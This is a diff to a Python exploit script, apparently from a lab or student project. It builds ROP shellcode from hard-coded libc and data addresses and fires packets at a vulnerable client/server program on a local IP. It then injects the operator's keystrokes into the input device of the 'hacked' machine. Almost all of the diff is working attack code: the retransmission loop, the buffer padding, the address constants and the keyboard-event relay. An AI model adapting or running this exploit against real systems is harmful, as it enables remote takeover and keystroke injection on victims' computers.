@@ -132,8 +132,12 @@ def write_file(text, ip_addr, port_no):
             generator.construct_shellcode()
             rop_code = rop_code[:preserved_length]
             client = subprocess.Popen(['bin/simple_client', ip_addr, port_no, '/'], stdout=FNULL)
-            while client.wait() != 0:
+            client.wait()
+            while client.returncode != 0:
+                print 'client.returncode: {rt}\nRetransmitting packet.'.format(rt=client.returncode)
                 client = subprocess.Popen(['bin/simple_client', ip_addr, port_no, '/'], stdout=FNULL)
+                client.wait()
+            print 'Packet sent'
             i = 0  
 
 def send_keypresses():
@@ -150,8 +154,8 @@ def send_keypresses():
 
 def main():
     # Keyboard mapping - this can be procured from the device that has been hacked into
-    if len(sys.argv) < 3:
-        print 'Event number of keyboard and path of keyboard mapping file needed.'
+    if len(sys.argv) < 2:
+        print 'Event number of keyboard of vulnerable system is required.'
         sys.exit(1)
 
     global rop_code
@@ -159,25 +163,26 @@ def main():
     global keys
     global generator
 
-    mapping_file = open(sys.argv[2], 'r')
+    mapping_file = open('/usr/include/linux/input.h', 'r')
     lines = mapping_file.readlines()
     mapping_file.close()
 
     for line in lines:
-        tokens = line.split(' ')
-        mapping[tokens[3][5:-2]] = tokens[2]
+        if '#define KEY_' in line:
+            tokens = line.rstrip().split()
+            mapping[tokens[1][4:]] = tokens[2]
 
     g.init(sys.argv[len(sys.argv)-1])
 
     # Hard-coded values
-    generator.libc_base = '0xb7e20000'
-    generator.data_base = '0x0804b068'
+    generator.libc_base = '0xb7e17000'
+    generator.data_base = '0x0804b084'
     generator.padding = 133
     generator.write_code = True
     generator.file_name = 'src/simple_client.c'
     generator.line_num = 11
     # Create two members for the object so that the ip_addr and port_no can be accessed anywhere
-    generator.ip_addr = '192.168.43.234'
+    generator.ip_addr = '192.168.1.3'
     generator.port_no = '10000'
 
     # generator.libc_base = hex(int(str(raw_input('Enter the libc base (format - 0xdeadbeef): ')).replace('L', ''), 16))
@@ -194,7 +199,7 @@ def main():
     open_file(file_name='/dev/input/event' + sys.argv[1])
 
     # This event number should be the hacker's keyboard event number
-    proc = subprocess.Popen(['evtest', '/dev/input/event1'], stdout=subprocess.PIPE)
+    proc = subprocess.Popen(['evtest', '/dev/input/event3'], stdout=subprocess.PIPE)
     expr = re.compile(r'Event: time [0-9]*\.[0-9]*, type [0-9]+ \(EV_KEY\), code ([0-9]+) \(KEY_([A-Z0-9]+)\), value 1')
     keys = []
     send_keypresses()
